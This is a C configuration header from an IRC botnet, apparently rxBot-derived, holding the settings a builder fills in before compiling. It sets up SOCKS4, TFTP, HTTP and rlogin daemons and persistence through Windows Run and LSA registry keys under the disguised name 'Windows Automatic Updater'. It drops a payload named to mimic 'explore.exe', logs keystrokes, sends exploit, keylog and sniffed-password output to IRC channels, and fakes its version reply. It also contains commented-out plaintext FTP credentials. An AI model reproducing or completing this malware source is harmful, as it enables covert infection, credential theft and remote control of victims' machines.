// bot configuration (generic) - doesn't need to be encrypted
int port = 7007;				// server port
int port2 = 7007;				// backup server port
int socks4port = 6060;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 69;				// Port # for tftp daemon to run on
int httpport = 9090;			// Port # for http daemon to run on
int rloginport = 513;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 6;				// how many random numbers in the nick
int nicktype = COUNTRYNICK;		// nick type (see rndnick.h)
BOOL nickprefix = TRUE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\systemdd.txt";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

/* char lsaip[] = "pro21.abac.com";                    // cftp host ".lsahost 192.168.1.1"
char lsaport[] = "21";			// cftp port ".lsaport 6969"
char lsuser[] = "neoxed";
char lspass[] = "marlboro"; */

// these have been tested and give best results, DON'T CHANGE!

SCANALL scanall[]={
{NULL, false}
};

//
BOOL sp2_mod = TRUE;				// sp2mod
char botid[] = "ntest0.1";						// bot id
char version[] = "ntest0.1";		// Bots !version reply
char password[] = "";					// bot password
char server[] = "";		// server
char serverpass[] = "";						// server password
char channel[] = "";				// channel that the bot should join
char chanpass[] = "";						// channel password
char server2[] = "";						// backup server (optional)
char channel2[] = "";						// backup channel (optional)
char chanpass2[] = "";						// backup channel password (optional)
char filename[] = "explore.exe";			// destination file name *** your payload should match this too ***
char keylogfile[] = "keys.txt";				// keylog filename
char valuename[] = "Windows Automatic Updater";		// value name for autostart
char nickconst[] = "tst-";					// first part to the bot's nick
char szLocalPayloadFile[]="explore.exe";	// **** make this the same as your bot filename! ****
char modeonconn[] = "-xt";					// Can be more than one mode and contain both + and -
char exploitchan[] = "";					// Channel where exploit messages get redirected
char keylogchan[] = "";						// Channel where keylog messages get redirected
char psniffchan[] = "";						// Channel where psniff messages get redirected

char *authost[] = {
	"*@*"
};

char *versionlist[] = {
	"roffer v1.2b24 [20031215140650], http://iroffer.org/",
	};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "2pckiws19f3bw3e0"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif